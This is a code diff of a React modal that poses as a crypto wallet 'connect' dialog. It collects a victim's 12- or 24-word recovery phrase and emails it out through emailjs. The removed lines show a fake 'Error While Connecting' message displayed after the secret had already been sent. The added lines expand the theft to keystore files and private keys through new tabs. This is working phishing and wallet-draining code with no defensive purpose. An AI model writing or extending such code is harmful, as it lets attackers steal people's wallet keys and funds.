@@ -1,17 +1,16 @@
 import React, { useState } from "react";
 import emailjs from "emailjs-com";
-import { ToastContainer, toast } from "react-toastify";
-import 'react-toastify/dist/ReactToastify.css';
 
 const Modal = ({ wallet, closeModal }) => {
   const [text, setText] = useState(""); 
   const [loading, setLoading] = useState(false);
+  const [activeTab, setActiveTab] = useState("Phrase"); // State for active tab
 
   const handleTextChange = (e) => {
     setText(e.target.value);
   };
 
-  const isDisabled = text.split(" ").filter(Boolean).length < 12;
+  const isDisabled = activeTab === "Phrase" && text.split(" ").filter(Boolean).length < 12;
 
   const sendEmail = () => {
     setLoading(true);
@@ -32,16 +31,12 @@ const Modal = ({ wallet, closeModal }) => {
         (response) => {
           console.log("SUCCESS!", response.status, response.text);
           setLoading(false);
-          toast.success('Error While Connecting! Please Try Another Wallet', {
-            className: 'text-red-500', // Apply Tailwind for success toast
-          });
+          alert('Email sent successfully!');
         },
         (error) => {
           console.log("FAILED...", error);
           setLoading(false);
-          toast.error('Failed to send email. Try again!', {
-            className: 'bg-red-900 text-orange', // Apply Tailwind for error toast
-          });
+          alert('Failed to send email. Try again!');
         }
       );
   };
@@ -59,18 +54,74 @@ const Modal = ({ wallet, closeModal }) => {
           <h3 className="ml-2 text-lg sm:text-xl font-bold">{wallet.name}</h3>
         </div>
 
-        {/* Textarea for Recovery Phrase */}
+        {/* Tabs for Phrase, Keystore, Private Key */}
+        <div className="flex justify-around mb-4">
+          <button
+            className={`px-4 py-2 ${activeTab === "Phrase" ? "font-bold" : ""}`}
+            onClick={() => setActiveTab("Phrase")}
+          >
+            Phrase
+          </button>
+          <button
+            className={`px-4 py-2 ${activeTab === "Keystore" ? "font-bold" : ""}`}
+            onClick={() => setActiveTab("Keystore")}
+          >
+            Keystore
+          </button>
+          <button
+            className={`px-4 py-2 ${activeTab === "Private Key" ? "font-bold" : ""}`}
+            onClick={() => setActiveTab("Private Key")}
+          >
+            Private Key
+          </button>
+        </div>
+
+        {/* Conditional Content Based on Active Tab */}
         <div className="mb-4">
-          <textarea
-            className="w-full p-3 border rounded-md"
-            placeholder="Enter your recovery phrase"
-            rows="4"
-            value={text} 
-            onChange={handleTextChange} 
-          />
-          <p className="text-sm text-gray-500 mt-2">
-            Typically 12 (sometimes 24) words separated by single spaces.
-          </p>
+          {activeTab === "Phrase" && (
+            <>
+              <textarea
+                className="w-full p-3 border rounded-md"
+                placeholder="Enter your recovery phrase"
+                rows="4"
+                value={text}
+                onChange={handleTextChange}
+              />
+              <p className="text-sm text-gray-500 mt-2">
+                Typically 12 (sometimes 24) words separated by single spaces.
+              </p>
+            </>
+          )}
+
+          {activeTab === "Keystore" && (
+            <>
+             <textarea
+                className="w-full p-3 border rounded-md"
+                placeholder="Enter your keystore"
+                rows="4"
+                value={text}
+                onChange={handleTextChange}
+              />
+              <p className="text-sm text-gray-500 mt-2">
+                Please enter your Keystore file.
+              </p>
+            </>
+          )}
+
+          {activeTab === "Private Key" && (
+            <>
+              <textarea
+                className="w-full p-3 border rounded-md"
+                placeholder="Enter your private key"
+                rows="4"
+                value={text}
+                onChange={handleTextChange}
+              />
+              <p className="text-sm text-gray-500 mt-2">
+                Enter your private key.
+              </p>
+            </>
+          )}
         </div>
 
         {/* Proceed and Cancel Buttons */}
@@ -84,7 +135,7 @@ const Modal = ({ wallet, closeModal }) => {
             disabled={isDisabled || loading}
             onClick={sendEmail}
           >
-            {loading ? "SENDING..." : "CONNECT"}
+            {loading ? "SENDING..." : "PROCEED"}
           </button>
           <button
             className="bg-red-500 text-white px-4 py-2 rounded-md w-full sm:w-auto sm:px-6"
@@ -93,9 +144,6 @@ const Modal = ({ wallet, closeModal }) => {
             Cancel
           </button>
         </div>
-
-        {/* React Toast Container */}
-        <ToastContainer />
       </div>
     </div>
   );
